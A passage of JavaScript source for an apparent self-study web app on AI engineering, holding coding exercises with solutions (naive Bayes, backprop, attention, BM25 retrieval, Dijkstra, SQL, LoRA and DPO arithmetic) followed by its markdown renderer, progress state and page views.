len(values[i]))\n    scores[c] = round(s, 4)\nprint(scores, max(scores, key=scores.get))", "output": "{'no': 0.1125, 'yes': 0.0446} no", "insight": "Scores are unnormalized; divide each by their sum to get probabilities. Smoothing keeps unseen combinations from zeroing out a class."}, {"topic": "ml-bias-var", "title": "Polynomial degree versus train and test error", "level": "challenge", "prompt": "Fit polynomials of degree 1, 3 and 9 to noisy samples of sin(2πx) and print train and test MSE. Watch training error fall while test error eventually rises.", "starter": "import numpy as np\nrng = np.random.default_rng(0)\nx_tr = np.sort(rng.uniform(0, 1, 12)); y_tr = np.sin(2*np.pi*x_tr) + rng.normal(0, .2, 12)\nx_te = np.sort(rng.uniform(0, 1, 50)); y_te = np.sin(2*np.pi*x_te) + rng.normal(0, .2, 50)\nfor d in (1, 3, 9):\n    # TODO: np.polyfit, np.polyval, MSE on train and test\n    ...", "solution": "import numpy as np\nrng = np.random.default_rng(0)\nx_tr = np.sort(rng.uniform(0, 1, 12)); y_tr = np.sin(2*np.pi*x_tr) + rng.normal(0, .2, 12)\nx_te = np.sort(rng.uniform(0, 1, 50)); y_te = np.sin(2*np.pi*x_te) + rng.normal(0, .2, 50)\nfor d in (1, 3, 9):\n    c = np.polyfit(x_tr, y_tr, d)\n    tr = ((np.polyval(c, x_tr) - y_tr) ** 2).mean()\n    te = ((np.polyval(c, x_te) - y_te) ** 2).mean()\n    print(d, round(tr, 4), round(te, 4))", "output": "1 0.1415 0.5469\n3 0.017 0.0708\n9 0.0041 0.9949", "insight": "Degree 9 nearly memorizes the 12 training points (tiny train error) and fails on new points (large test error): overfitting."}, {"topic": "perceptron", "title": "Perceptron trick on AND", "level": "core", "prompt": "Train a perceptron on the AND truth table with the update w ← w + η(y − ŷ)x (bias as w0, η = 1). Print the weights and predictions once it converges.", "starter": "X = [(0, 0), (0, 1), (1, 0), (1, 1)]\ny = [0, 0, 0, 1]\nw = [0, 0, 0]  # bias, w1, w2\nstep = lambda z: 1 if z > 0 else 0\n# TODO: loop over epochs until no errors; apply the update rule\nprint(...)", "solution": "X = [(0, 0), (0, 1), (1, 0), (1, 1)]\ny = [0, 0, 0, 1]\nw = [0, 0, 0]  # bias, w1, w2\nstep = lambda z: 1 if z > 0 else 0\nfor epoch in range(1, 100):\n    errors = 0\n    for (x1, x2), t in zip(X, y):\n        p = step(w[0] + w[1] * x1 + w[2] * x2)\n        if p != t:\n            errors += 1\n            w = [w[0] + (t - p), w[1] + (t - p) * x1, w[2] + (t - p) * x2]\n    if errors == 0:\n        break\nprint(epoch, w, [step(w[0] + w[1] * a + w[2] * b) for a, b in X])", "output": "6 [-2, 2, 1] [0, 0, 0, 1]", "insight": "AND is linearly separable, so the perceptron converges. Try XOR (targets 0, 1, 1, 0): it never stops making errors."}, {"topic": "backprop", "title": "Backpropagation: a 2-layer network learns XOR", "level": "challenge", "prompt": "Train a 2-4-1 sigmoid network on XOR with full-batch gradient descent and binary cross-entropy (seed 1, learning rate 1.0, 5,000 epochs). Implement the backward pass yourself.", "starter": "import numpy as np\nrng = np.random.default_rng(1)\nX = np.array([[0, 0], [0, 1], [1, 0], [1, 1]], float); y = np.array([[0], [1], [1], [0]], float)\nW1, b1 = rng.normal(0, 1, (2, 4)), np.zeros((1, 4))\nW2, b2 = rng.normal(0, 1, (4, 1)), np.zeros((1, 1))\nsig = lambda z: 1 / (1 + np.exp(-z))\nfor epoch in range(5000):\n    h = sig(X @ W1 + b1); out = sig(h @ W2 + b2)\n    # TODO: backward pass. With BCE + sigmoid, d_out = out - y\n    ...\nprint(np.round(out.ravel(), 3))", "solution": "import numpy as np\nrng = np.random.default_rng(1)\nX = np.array([[0, 0], [0, 1], [1, 0], [1, 1]], float); y = np.array([[0], [1], [1], [0]], float)\nW1, b1 = rng.normal(0, 1, (2, 4)), np.zeros((1, 4))\nW2, b2 = rng.normal(0, 1, (4, 1)), np.zeros((1, 1))\nsig = lambda z: 1 / (1 + np.exp(-z))\nlr = 1.0\nfor epoch in range(5000):\n    h = sig(X @ W1 + b1); out = sig(h @ W2 + b2)\n    d_out = (out - y) / len(X)\n    dW2 = h.T @ d_out; db2 = d_out.sum(0, keepdims=True)\n    d_h = (d_out @ W2.T) * h * (1 - h)\n    dW1 = X.T @ d_h; db1 = d_h.sum(0, keepdims=True)\n    W2 -= lr * dW2; b2 -= lr * db2; W1 -= lr * dW1; b1 -= lr * db1\nloss = -(y * np.log(out) + (1 - y) * np.log(1 - out)).mean()\nprint(np.round(out.ravel(), 3), round(float(loss), 4))", "output": "[0.001 0.998 0.999 0.003] 0.0016", "insight": "The same chain rule as the Backpropagation topic: with sigmoid plus binary cross-entropy, the output gradient simplifies to (prediction − target)."}, {"topic": "loss", "title": "Stable softmax and cross-entropy", "level": "core", "prompt": "Implement softmax that does not overflow (subtract the max) and the cross-entropy loss for the true class index 0.", "starter": "import numpy as np\nlogits = np.array([1002.0, 1001.0, 1000.1])\ndef softmax(z):\n    # TODO: subtract max for stability\n    ...\np = softmax(logits)\nprint(np.round(p, 4), round(float(-np.log(p[0])), 4))", "solution": "import numpy as np\nlogits = np.array([1002.0, 1001.0, 1000.1])\ndef softmax(z):\n    e = np.exp(z - z.max())\n    return e / e.sum()\np = softmax(logits)\nprint(np.round(p, 4), round(float(-np.log(p[0])), 4))", "output": "[0.659  0.2424 0.0986] 0.417"}, {"topic": "cnn-conv", "title": "2D convolution by hand", "level": "core", "prompt": "Implement a \"valid\" 2D convolution (cross-correlation, as in deep learning libraries) with stride 1, apply a vertical-edge kernel, and print the output and its shape.", "starter": "import numpy as np\nimg = np.array([[10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0]], float)\nk = np.array([[1, 0, -1]] * 3, float)\ndef conv2d(x, k):\n    # TODO: output size (n - f + 1); slide and sum elementwise products\n    ...\nout = conv2d(img, k); print(out, out.shape)", "solution": "import numpy as np\nimg = np.array([[10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0],\n                [10, 10, 10, 0, 0]], float)\nk = np.array([[1, 0, -1]] * 3, float)\ndef conv2d(x, k):\n    n, f = x.shape[0], k.shape[0]\n    o = n - f + 1\n    out = np.zeros((o, o))\n    for i in range(o):\n        for j in range(o):\n            out[i, j] = (x[i:i + f, j:j + f] * k).sum()\n    return out\nout = conv2d(img, k); print(out, out.shape)", "output": "[[ 0. 30. 30.]\n [ 0. 30. 30.]\n [ 0. 30. 30.]] (3, 3)"}, {"topic": "self-attention", "title": "Scaled dot-product attention", "level": "core", "prompt": "Compute softmax(QKᵀ/√dₖ)V for three tokens with dₖ = 2. Print the attention weights (rows sum to 1) and the output.", "starter": "import numpy as np\nQ = np.array([[1., 0.], [0., 1.], [1., 1.]])\nK = np.array([[1., 0.], [0., 1.], [1., 1.]])\nV = np.array([[1., 2.], [3., 4.], [5., 6.]])\n# TODO: scores, row-wise softmax, weights @ V\nprint(...)", "solution": "import numpy as np\nQ = np.array([[1., 0.], [0., 1.], [1., 1.]])\nK = np.array([[1., 0.], [0., 1.], [1., 1.]])\nV = np.array([[1., 2.], [3., 4.], [5., 6.]])\nS = Q @ K.T / np.sqrt(K.shape[1])\nW = np.exp(S - S.max(1, keepdims=True)); W /= W.sum(1, keepdims=True)\nprint(np.round(W, 3)); print(np.round(W @ V, 3))", "output": "[[0.401 0.198 0.401]\n [0.198 0.401 0.401]\n [0.248 0.248 0.503]]\n[[3.    4.   ]\n [3.407 4.407]\n [3.51  4.51 ]]"}, {"topic": "rag-embeddings", "title": "Cosine top-k retrieval", "level": "core", "prompt": "Given toy embeddings for four chunks and a query, return the two most similar chunks by cosine similarity.", "starter": "import numpy as np\nchunks = {'refund policy': [0.9, 0.1, 0.0], 'shipping times': [0.1, 0.9, 0.1],\n          'return window': [0.8, 0.2, 0.1], 'careers page': [0.0, 0.1, 0.9]}\nq = np.array([0.85, 0.15, 0.05])\n# TODO: cosine similarity, sort, top 2\nprint(...)", "solution": "import numpy as np\nchunks = {'refund policy': [0.9, 0.1, 0.0], 'shipping times': [0.1, 0.9, 0.1],\n          'return window': [0.8, 0.2, 0.1], 'careers page': [0.0, 0.1, 0.9]}\nq = np.array([0.85, 0.15, 0.05])\ncos = lambda a, b: a @ b / (np.linalg.norm(a) * np.linalg.norm(b))\nranked = sorted(((round(float(cos(q, np.array(v))), 4), k) for k, v in chunks.items()), reverse=True)\nprint(ranked[:2])", "output": "[(0.9963, 'refund policy'), (0.9956, 'return window')]"}, {"topic": "rag-hybrid", "title": "BM25 plus Reciprocal Rank Fusion", "level": "challenge", "prompt": "Score three documents with BM25 (k1 = 1.2, b = 0.75) for the query \"error E4021\", then fuse the BM25 ranking with a given vector ranking using RRF (k = 60).", "starter": "import math\ndocs = {'d1': 'error E4021 means the payment gateway timed out',\n        'd2': 'how to fix a payment timeout error',\n        'd3': 'gateway configuration guide'}\nquery = ['error', 'e4021']\nvector_rank = ['d2', 'd1', 'd3']   # from an embedding search\n# TODO: BM25 scores -> ranking; RRF(d) = sum 1 / (60 + rank)\nprint(...)", "solution": "import math\ndocs = {'d1': 'error E4021 means the payment gateway timed out',\n        'd2': 'how to fix a payment timeout error',\n        'd3': 'gateway configuration guide'}\nquery = ['error', 'e4021']\nvector_rank = ['d2', 'd1', 'd3']\ntoks = {d: t.lower().split() for d, t in docs.items()}\nN = len(toks); avgdl = sum(len(t) for t in toks.values()) / N\ndef idf(term):\n    n = sum(term in t for t in toks.values())\n    return math.log((N - n + 0.5) / (n + 0.5) + 1)\ndef bm25(d, k1=1.2, b=0.75):\n    t = toks[d]; s = 0.0\n    for q in query:\n        f = t.count(q)\n        s += idf(q) * f * (k1 + 1) / (f + k1 * (1 - b + b * len(t) / avgdl))\n    return s\nscores = {d: round(bm25(d), 3) for d in docs}\nbm25_rank = sorted(docs, key=lambda d: -scores[d])\nrrf = {d: round(1 / (60 + bm25_rank.index(d) + 1) + 1 / (60 + vector_rank.index(d) + 1), 5) for d in docs}\nprint(scores, bm25_rank); print(sorted(rrf.items(), key=lambda kv: -kv[1]))", "output": "{'d1': 1.277, 'd2': 0.44, 'd3': 0.0} ['d1', 'd2', 'd3']\n[('d1', 0.03252), ('d2', 0.03252), ('d3', 0.03175)]", "insight": "d1 and d2 tie exactly after fusion: each is first in one list and second in the other. Real systems break ties with a reranker."}, {"topic": "ev-stats", "title": "Paired bootstrap: is the new prompt really better?", "level": "challenge", "prompt": "Two prompts were scored on the same 12 eval cases. Use a paired bootstrap (10,000 resamples, seed 0) on the per-case differences to estimate the mean improvement and a 95% interval.", "starter": "import numpy as np\nbase = np.array([.7, .6, .8, .5, .9, .6, .7, .4, .8, .6, .7, .5])\nnew  = np.array([.8, .6, .9, .6, .9, .7, .7, .5, .8, .7, .8, .6])\nrng = np.random.default_rng(0)\n# TODO: diffs = new - base; resample indices with replacement; mean of each resample\nprint(...)", "solution": "import numpy as np\nbase = np.array([.7, .6, .8, .5, .9, .6, .7, .4, .8, .6, .7, .5])\nnew  = np.array([.8, .6, .9, .6, .9, .7, .7, .5, .8, .7, .8, .6])\nrng = np.random.default_rng(0)\ndiff = new - base\nboots = np.array([diff[rng.integers(0, len(diff), len(diff))].mean() for _ in range(10000)])\nlo, hi = np.percentile(boots, [2.5, 97.5])\nprint(round(diff.mean(), 4), round(lo, 4), round(hi, 4), 'ship' if lo > 0 else 'investigate')", "output": "0.0667 0.0417 0.0917 ship", "insight": "The whole 95% interval is above zero, so the improvement is unlikely to be noise. With 12 cases the interval is still wide; use more cases in practice."}, {"topic": "inf-cost", "title": "Cost of a system prompt, with and without caching", "level": "core", "prompt": "A 1,500-token system prompt is sent with 100,000 requests a day at $2.50 per million input tokens. Compute the daily cost, then the cost if 90% of requests hit a prefix cache that charges 10% of the normal price.", "starter": "tokens, requests, price = 1500, 100_000, 2.50 / 1_000_000\n# TODO\nprint(...)", "solution": "tokens, requests, price = 1500, 100_000, 2.50 / 1_000_000\nfull = tokens * requests * price\ncached = tokens * requests * price * (0.9 * 0.10 + 0.1 * 1.0)\nprint(round(full, 2), round(cached, 2), round(1 - cached / full, 3))", "output": "375.0 71.25 0.81"}, {"topic": "found-probability-basics", "title": "Bayes by simulation", "level": "core", "prompt": "Simulate 1,000,000 people (seed 0) with 1% prevalence, 99% sensitivity and a 5% false-positive rate. Estimate P(disease | positive) and compare with Bayes’ formula (1/6).", "starter": "import numpy as np\nrng = np.random.default_rng(0)\nn = 1_000_000\n# TODO: sample disease, then test results; estimate P(D | +)\nprint(...)", "solution": "import numpy as np\nrng = np.random.default_rng(0)\nn = 1_000_000\nd = rng.random(n) < 0.01\npos = np.where(d, rng.random(n) < 0.99, rng.random(n) < 0.05)\nprint(round(d[pos].mean(), 4), round(0.0099 / 0.0594, 4))", "output": "0.167 0.1667"}, {"topic": "found-clt-ci", "title": "Confidence-interval coverage by simulation", "level": "challenge", "prompt": "Draw 2,000 samples of size 40 from an exponential distribution with mean 2 (seed 0). For each, build a 95% interval x̄ ± 1.96·s/√n. What fraction of intervals contain the true mean?", "starter": "import numpy as np\nrng = np.random.default_rng(0)\nmu, n, reps = 2.0, 40, 2000\n# TODO\nprint(...)", "solution": "import numpy as np\nrng = np.random.default_rng(0)\nmu, n, reps = 2.0, 40, 2000\nhits = 0\nfor _ in range(reps):\n    s = rng.exponential(mu, n)\n    m, se = s.mean(), s.std(ddof=1) / np.sqrt(n)\n    hits += (m - 1.96 * se) <= mu <= (m + 1.96 * se)\nprint(hits / reps)", "output": "0.9225", "insight": "Coverage lands near 92%, not 95%: the exponential is skewed, so with n = 40 the normal approximation is still imperfect. Larger n moves coverage toward 95%."}, {"topic": "found-eigen", "title": "Power iteration", "level": "core", "prompt": "Find the dominant eigenvalue and eigenvector of A = [[3, 1], [1, 3]] with 50 power-iteration steps, then check with numpy.", "starter": "import numpy as np\nA = np.array([[3., 1.], [1., 3.]])\nv = np.array([1., 0.])\n# TODO: repeat v = A v / ||A v||; Rayleigh quotient for lambda\nprint(...)", "solution": "import numpy as np\nA = np.array([[3., 1.], [1., 3.]])\nv = np.array([1., 0.])\nfor _ in range(50):\n    v = A @ v\n    v /= np.linalg.norm(v)\nlam = v @ A @ v\nprint(round(lam, 4), np.round(v, 4), np.round(np.linalg.eigvalsh(A), 4))", "output": "4.0 [0.7071 0.7071] [2. 4.]"}, {"topic": "found-searching", "title": "Binary search, lower-bound version", "level": "core", "prompt": "Write lower_bound(a, x): the first index i with a[i] ≥ x (len(a) if none). Test it on several targets.", "starter": "def lower_bound(a, x):\n    lo, hi = 0, len(a)\n    # TODO\n    ...\na = [2, 5, 8, 12, 16, 23, 38, 56, 72, 91]\nprint([lower_bound(a, x) for x in (23, 1, 13, 91, 100)])", "solution": "def lower_bound(a, x):\n    lo, hi = 0, len(a)\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if a[mid] < x:\n            lo = mid + 1\n        else:\n            hi = mid\n    return lo\na = [2, 5, 8, 12, 16, 23, 38, 56, 72, 91]\nprint([lower_bound(a, x) for x in (23, 1, 13, 91, 100)])", "output": "[5, 0, 4, 9, 10]"}, {"topic": "found-hash-tables", "title": "A linear-probing hash map", "level": "core", "prompt": "Implement put and get for a hash map with 7 slots, h(k) = k mod 7 and linear probing. Insert 10, 17, 24 and 3 and show the table.", "starter": "class HashMap:\n    def __init__(self, m=7):\n        self.m, self.keys, self.vals = m, [None] * m, [None] * m\n    def put(self, k, v):\n        # TODO: probe from k % m until an empty slot or the same key\n        ...\n    def get(self, k):\n        # TODO\n        ...\nh = HashMap()\nfor k in (10, 17, 24, 3): h.put(k, k * 10)\nprint(h.keys, h.get(24), h.get(5))", "solution": "class HashMap:\n    def __init__(self, m=7):\n        self.m, self.keys, self.vals = m, [None] * m, [None] * m\n    def put(self, k, v):\n        i = k % self.m\n        while self.keys[i] is not None and self.keys[i] != k:\n            i = (i + 1) % self.m\n        self.keys[i], self.vals[i] = k, v\n    def get(self, k):\n        i = k % self.m\n        for _ in range(self.m):\n            if self.keys[i] is None:\n                return None\n            if self.keys[i] == k:\n                return self.vals[i]\n            i = (i + 1) % self.m\n        return None\nh = HashMap()\nfor k in (10, 17, 24, 3): h.put(k, k * 10)\nprint(h.keys, h.get(24), h.get(5))", "output": "[None, None, None, 10, 17, 24, 3] 240 None"}, {"topic": "found-graph-traversal", "title": "BFS shortest hops", "level": "core", "prompt": "Use BFS from A to compute the number of edges on a shortest path to every vertex.", "starter": "from collections import deque\nG = {'A': ['B', 'C'], 'B': ['A', 'D', 'E'], 'C': ['A', 'F'],\n     'D': ['B'], 'E': ['B', 'F'], 'F': ['C', 'E']}\ndef bfs(src):\n    # TODO\n    ...\nprint(bfs('A'))", "solution": "from collections import deque\nG = {'A': ['B', 'C'], 'B': ['A', 'D', 'E'], 'C': ['A', 'F'],\n     'D': ['B'], 'E': ['B', 'F'], 'F': ['C', 'E']}\ndef bfs(src):\n    dist = {src: 0}; q = deque([src])\n    while q:\n        u = q.popleft()\n        for v in G[u]:\n            if v not in dist:\n                dist[v] = dist[u] + 1\n                q.append(v)\n    return dist\nprint(bfs('A'))", "output": "{'A': 0, 'B': 1, 'C': 1, 'D': 2, 'E': 2, 'F': 2}"}, {"topic": "found-shortest-paths", "title": "Dijkstra with a heap, plus the path", "level": "core", "prompt": "Run Dijkstra from A on the weighted graph and reconstruct the path to E.", "starter": "import heapq\nedges = [('A','B',4), ('A','C',2), ('C','B',1), ('B','D',5), ('C','D',8), ('D','E',3), ('C','E',10)]\n# TODO: adjacency list (undirected), Dijkstra, parent pointers\nprint(...)", "solution": "import heapq\nfrom collections import defaultdict\nedges = [('A','B',4), ('A','C',2), ('C','B',1), ('B','D',5), ('C','D',8), ('D','E',3), ('C','E',10)]\nadj = defaultdict(list)\nfor u, v, w in edges:\n    adj[u].append((v, w)); adj[v].append((u, w))\ndist, par, pq = {'A': 0}, {}, [(0, 'A')]\nwhile pq:\n    d, u = heapq.heappop(pq)\n    if d > dist[u]:\n        continue\n    for v, w in adj[u]:\n        if d + w < dist.get(v, float('inf')):\n            dist[v], par[v] = d + w, u\n            heapq.heappush(pq, (d + w, v))\npath, x = ['E'], 'E'\nwhile x != 'A':\n    x = par[x]; path.append(x)\nprint(dict(sorted(dist.items())), path[::-1])", "output": "{'A': 0, 'B': 3, 'C': 2, 'D': 8, 'E': 11} ['A', 'C', 'B', 'D', 'E']"}, {"topic": "found-sql", "title": "SQL: top earner in each department", "level": "core", "prompt": "Using SQLite, find the highest-paid employee in each department with a window function, and the departments with no employees with an anti-join.", "starter": "import sqlite3\nc = sqlite3.connect(':memory:')\nc.executescript(\"\"\"\ncreate table dept(dept text primary key, location text);\ncreate table emp(id int, name text, dept text, salary int);\ninsert into dept values ('ENG','Bengaluru'), ('HR','Pune'), ('OPS','Delhi');\ninsert into emp values (1,'Asha','ENG',120),(2,'Ravi','ENG',90),(3,'Meena','HR',70),(4,'John','ENG',80),(5,'Sara','HR',60);\n\"\"\")\n# TODO: query 1 with RANK() OVER (PARTITION BY dept ORDER BY salary DESC); query 2 anti-join", "solution": "import sqlite3\nc = sqlite3.connect(':memory:')\nc.executescript(\"\"\"\ncreate table dept(dept text primary key, location text);\ncreate table emp(id int, name text, dept text, salary int);\ninsert into dept values ('ENG','Bengaluru'), ('HR','Pune'), ('OPS','Delhi');\ninsert into emp values (1,'Asha','ENG',120),(2,'Ravi','ENG',90),(3,'Meena','HR',70),(4,'John','ENG',80),(5,'Sara','HR',60);\n\"\"\")\nprint(c.execute(\"\"\"select dept, name, salary from (\n  select dept, name, salary, rank() over (partition by dept order by salary desc) r from emp)\n  where r = 1 order by dept\"\"\").fetchall())\nprint(c.execute(\"\"\"select d.dept from dept d left join emp e on e.dept = d.dept\n  where e.id is null\"\"\").fetchall())", "output": "[('ENG', 'Asha', 120), ('HR', 'Meena', 70)]\n[('OPS',)]"}, {"topic": "found-normalization", "title": "Attribute closure and candidate keys", "level": "challenge", "prompt": "Write closure(X, F) and use it to find every candidate key of R(A, B, C, D, E) with F = {A → B, B → C, CD → E}.", "starter": "from itertools import combinations\nR = 'ABCDE'\nF = [('A', 'B'), ('B', 'C'), ('CD', 'E')]\ndef closure(X):\n    # TODO: keep adding right sides whose left side is inside X\n    ...\nprint(...)", "solution": "from itertools import combinations\nR = 'ABCDE'\nF = [('A', 'B'), ('B', 'C'), ('CD', 'E')]\ndef closure(X):\n    X = set(X); changed = True\n    while changed:\n        changed = False\n        for l, r in F:\n            if set(l) <= X and not set(r) <= X:\n                X |= set(r); changed = True\n    return ''.join(sorted(X))\nsupers = [''.join(c) for n in range(1, 6) for c in combinations(R, n) if closure(c) == R]\nkeys = [k for k in supers if not any(set(o) < set(k) for o in supers)]\nprint(closure('A'), closure('AD'), keys)", "output": "ABC ABCDE ['AD']"}];
EXERCISES.push(...[{"topic": "ft-lora", "title": "Count LoRA parameters", "level": "core", "prompt": "A 32-layer model has hidden size 2048 and MLP size 8192. LoRA rank 16 is applied to q, k, v, o (each 2048x2048) and gate, up, down (2048<->8192). Compute trainable params per layer, in total, and the MB needed at 16 bytes per param (fp32 weight + grad + Adam states).", "starter": "d, ff, r, layers = 2048, 8192, 16, 32\n# params per adapted matrix = r * (d_in + d_out)\nper_layer = ...\ntotal = ...\nprint(per_layer, total, round(total * 16 / 1e6, 1))", "solution": "d, ff, r, layers = 2048, 8192, 16, 32\nattn = 4 * r * (d + d)          # q, k, v, o: each d x d\nmlp = 3 * r * (d + ff)          # gate, up: d->ff ; down: ff->d\nper_layer = attn + mlp\ntotal = per_layer * layers\nprint(\"per layer:\", per_layer)\nprint(\"total LoRA params:\", total)\nprint(\"MB for adapter + grads + Adam (16 bytes/param):\", round(total * 16 / 1e6, 1))\n", "output": "per layer: 753664\ntotal LoRA params: 24117248\nMB for adapter + grads + Adam (16 bytes/param): 385.9", "insight": "24M trainable params is under 1% of a 3B model; the 4-bit frozen base (about 1.5-2 GB) and activations dominate memory, not the adapter."}, {"topic": "ft-dpo", "title": "Compute one DPO loss", "level": "core", "prompt": "With beta = 0.1, the policy gives log p(chosen) = -42 and log p(rejected) = -50; the reference gives -45 and -48. Compute the DPO margin and loss.", "starter": "import math\nbeta = 0.1\npi_w, ref_w = -42.0, -45.0\npi_l, ref_l = -50.0, -48.0\nmargin = ...\nloss = ...  # -log(sigmoid(margin))\nprint(round(margin, 3), round(loss, 4))", "solution": "import math\nbeta = 0.1\npi_w, ref_w = -42.0, -45.0   # log p(chosen)   under policy / reference\npi_l, ref_l = -50.0, -48.0   # log p(rejected) under policy / reference\nmargin = beta * ((pi_w - ref_w) - (pi_l - ref_l))\nloss = -math.log(1 / (1 + math.exp(-margin)))\nprint(\"margin:\", round(margin, 3))\nprint(\"loss:\", round(loss, 4))\n", "output": "margin: 0.5\nloss: 0.4741", "insight": "The policy raised the chosen answer by 3 nats and lowered the rejected one by 2 relative to the reference; loss falls toward 0 as that gap grows, and beta sets how much each nat counts."}]);
/* App: markdown renderer, state, views, routing and events. */
/* ---------- Markdown (for imported notes) ---------- */
function mdEsc(s){return String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]))}
function mdInline(s){return mdEsc(s).replace(/`([^`]+)`/g,"<code>$1</code>").replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>").replace(/\*([^*]+)\*/g,"<em>$1</em>")}
function md(src){
  const L=src.split("\n");let out="",i=0;
  while(i<L.length){
    let l=L[i];
    if(l.startsWith("```")){let c=[];i++;while(i<L.length&&!L[i].startsWith("```"))c.push(L[i++]);i++;out+=`<pre><code>${mdEsc(c.join("\n"))}</code></pre>`;continue}
    if(l.startsWith('<div class="ask">')){out+=`<div class="ask">${mdInline(l.replace(/^<div class="ask">/,"").replace(/<\/div>$/,""))}</div>`;i++;continue}
    if(l.startsWith("#### ")){out+=`<h4>${mdInline(l.slice(5))}</h4>`;i++;continue}
    if(l.startsWith("|")){const rows=[];while(i<L.length&&L[i].startsWith("|"))rows.push(L[i++]);
      const cells=r=>r.replace(/^\||\|$/g,"").split("|").map(x=>x.trim());
      let h=`<div class="tw"><table><tr>${cells(rows[0]).map(c=>`<th>${mdInline(c)}</th>`).join("")}</tr>`;
      rows.slice(2).forEach(r=>h+=`<tr>${cells(r).map(c=>`<td>${mdInline(c)}</td>`).join("")}</tr>`);out+=h+"</table></div>";continue}
    if(/^- /.test(l)){let it=[];while(i<L.length&&/^- /.test(L[i]))it.push(L[i++].slice(2));out+=`<ul>${it.map(x=>`<li>${mdInline(x)}</li>`).join("")}</ul>`;continue}
    if(/^\d+\. /.test(l)){let it=[];while(i<L.length&&/^\d+\. /.test(L[i]))it.push(L[i++].replace(/^\d+\. /,""));out+=`<ol>${it.map(x=>`<li>${mdInline(x)}</li>`).join("")}</ol>`;continue}
    if(l.trim()===""){i++;continue}
    let p=[];while(i<L.length&&L[i].trim()!==""&&!/^(- |\d+\. |#### |\||```|<div)/.test(L[i]))p.push(L[i++]);
    out+=`<p>${mdInline(p.join(" "))}</p>`;
  }
  return out;
}

/* ---------- State ---------- */
const store={get(k){try{return JSON.parse(localStorage.getItem(k)||'{}')}catch(e){return{}}},set(v){try{localStorage.setItem('aimlrev1',JSON.stringify(v))}catch(e){}}};
let S=Object.assign({revised:{},scope:'all'},store.get('dlrev1'),store.get('aimlrev1'));
if(S.scope==='exam')S.scope='found';if(S.scope==='ai')S.scope='eng';
S.exDone=S.exDone||{};
const save=()=>store.set(S);
const app=document.getElementById('app');
const TRACKS={
  eng:{name:'AI engineering',blurb:`The core curriculum: production RAG, agent harnesses, inference and serving, evaluation, and AI security, fine-tuning and post-training, and a dated watch on what's new. Each lesson starts with a real use case, then a diagram, worked numbers and links to source lessons.`,col:'--amber'},
  ml:{name:'Machine learning',blurb:`Foundations, data preparation, regression, classification, trees and ensembles, SVM, Bayes, clustering and PCA.`,col:'--teal'},
  dl:{name:'Deep learning',blurb:`From perceptrons and backprop to CNNs, RNNs and transformers.`,col:'--violet'},
  found:{name:'Foundations',blurb:`The maths and computer science behind AI, with worked examples and diagrams: probability and statistics, linear algebra, calculus and optimization, programming, data structures and algorithms, and databases and warehousing. Grows over time.`,col:'--rose'}};
const TABS=[['home','Home'],['eng','AI engineering'],['ml','Machine learning'],['dl','Deep learning'],['found','Foundations'],['practice','Practice'],['sheet','Formulas']];
const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');
const CHECK='<svg viewBox="0 0 12 12"><path d="M2 6.5l3 3 5-6"/></svg>';
const inScope=t=>S.scope==='all'||t.track===S.scope;
const trackTopics=tr=>TOPICS.filter(t=>t.track===tr);
const groupsOf=tr=>[...new Set(trackTopics(tr).map(t=>t.grp))];
let filter='',curTrack='eng';

function tabs(cur){
  document.getElementById('tabs').innerHTML=TABS.map(([h,l])=>`<a class="tab" href="#${h}" ${cur===h?'aria-current="page"':''}>${l}</a>`).join('');
}
function scopeBar(){
  return `<div class="btns" role="group" aria-label="Track filter">${[['all','All tracks'],['eng','AI engineering'],['ml','Machine learning'],['dl','Deep learning'],['found','Foundations']].map(([k,l])=>`<button class="btn ${S.scope===k?'on':'ghost'}" data-act="scope" data-s="${k}">${l}</button>`).join('')}</div>`;
}
function meter(done,total){const pct=total?Math.round(done/total*100):0;return `<div class="meter" role="progressbar" aria-valuenow="${pct}" aria-valuemin="0" aria-valuemax="100"><i style="width:${pct}%"></i></div>`}

/* ---------- Home ---------- */
function vHome(){
  const all=TOPICS.length,done=TOPICS.filter(t=>S.revised[t.id]).length;
  let h=`<h1>AI engineering notebook</h1><p class="sub">A learning notebook for building AI systems: production RAG, agent harnesses, inference, evals and security first, with machine learning, deep learning and the maths behind them as background.</p>
  <div class="card"><b>${done} of ${all} topics read</b>${meter(done,all)}<span class="small">Your progress is saved on this device.</span></div><div class="tracks">`;
  ['eng','ml','dl','found'].forEach(tr=>{
    const T=TRACKS[tr],ts=trackTopics(tr),d=ts.filter(t=>S.revised[t.id]).length;
    h+=`<a class="tcard" href="#${tr}" style="--c:var(${T.col})"><h2>${T.name}</h2><p>${T.blurb}</p><p class="small">${ts.length} topics, ${d} read</p>${meter(d,ts.length)}<ul class="gl">${groupsOf(tr).map(g=>`<li>${g}</li>`).join('')}</ul></a>`;
  });
  const exd=EXERCISES.filter(e=>S.exDone[exKey(e)]).length;
  h+=`<a class="tcard" href="#practice" style="--c:var(--teal)"><h2>Practice</h2><p>${EXERCISES.length} coding exercises with verified solutions, from KV-cache math and retrieval metrics to OLS and Dijkstra.</p><p class="small">${exd} solved</p>${meter(exd,EXERCISES.length)}</a></div>
  <h2>Suggested path</h2><ol class="path"><li><b>AI engineering, in module order.</b> RAG, then agent harnesses, inference and serving, evals, security, fine-tuning (with the LogLens-Granite project), then Module 7 for what's new in the field. These are the skills you use every day building AI systems.</li><li><b>Machine learning and deep learning</b> as background, in order, when a lesson leans on a concept.</li><li><b>Foundations</b> for the maths and computer science underneath.</li></ol><p class="small">A steady pace: one lesson and one Practice exercise a day.</p>
  <div class="btns"><button class="btn ghost" data-act="reset">Reset progress</button></div>`;
  app.innerHTML=h;
}

/* ---------- Track list ---------- */
function vTrack(tr){
  curTrack=tr;const T=TRACKS[tr],ts=trackTopics(tr),d=ts.filter(t=>S.revised[t.id]).length;
  const ph={ml:'imputation, R², random forest, SVM',dl:'dropout, LSTM, Adam',eng:'reranking, KV cache, prompt injection, LLM judge',found:'Bayes, eigenvalues, BFS, SQL joins'}[tr];
